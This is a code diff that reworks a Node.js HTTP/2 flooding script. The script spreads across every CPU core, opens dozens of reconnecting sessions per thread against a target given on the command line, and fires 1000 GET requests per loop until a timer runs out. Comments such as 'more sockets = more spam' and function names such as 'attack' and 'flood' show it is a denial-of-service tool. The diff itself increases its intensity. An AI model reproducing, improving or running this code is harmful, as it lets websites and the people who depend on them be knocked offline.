@@ -2,7 +2,7 @@ const http2 = require('http2');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const { cpus } = require('os');
 
-const THREADS = cpus().length; // USE ALL CORES
+const THREADS = cpus().length;
 
 if (isMainThread) {
     if (process.argv.length < 4) {
@@ -22,29 +22,40 @@ if (isMainThread) {
     const { target, duration } = workerData;
     const end = Date.now() + duration * 1000;
 
-    function flood(client) {
-        const spam = () => {
-            if (Date.now() > end || client.closed || client.destroyed) return;
-            try {
-                for (let i = 0; i < 500; i++) {
-                    const req = client.request({ ':path': '/', ':method': 'GET' });
-                    req.on('error', () => {});
-                    req.end();
+    const attack = () => {
+        try {
+            const client = http2.connect(target, {
+                settings: { enablePush: false },
+                maxSessionMemory: 999999,
+            });
+
+            client.on('error', () => {});
+            client.on('goaway', () => client.destroy());
+            client.on('close', () => setTimeout(attack, 10));
+
+            client.on('connect', () => {
+                function flood() {
+                    if (Date.now() > end || client.destroyed) return;
+
+                    for (let i = 0; i < 1000; i++) {
+                        try {
+                            const req = client.request({
+                                ':method': 'GET',
+                                ':path': '/',
+                            });
+                            req.on('error', () => {});
+                            req.end();
+                        } catch {}
+                    }
+                    setImmediate(flood);
                 }
-                setImmediate(spam);
-            } catch {
-                // skip errors
-            }
-        };
-        spam();
-    }
 
-    function createConnection() {
-        const client = http2.connect(target);
-        client.on('error', () => {});
-        client.on('close', () => setTimeout(createConnection, 10));
-        client.on('connect', () => flood(client));
-    }
+                flood();
+            });
+        } catch {
+            setTimeout(attack, 50);
+        }
+    };
 
-    for (let i = 0; i < 30; i++) createConnection(); // 30 sessions per thread
+    for (let i = 0; i < 40; i++) attack(); // more sockets = more spam
 }
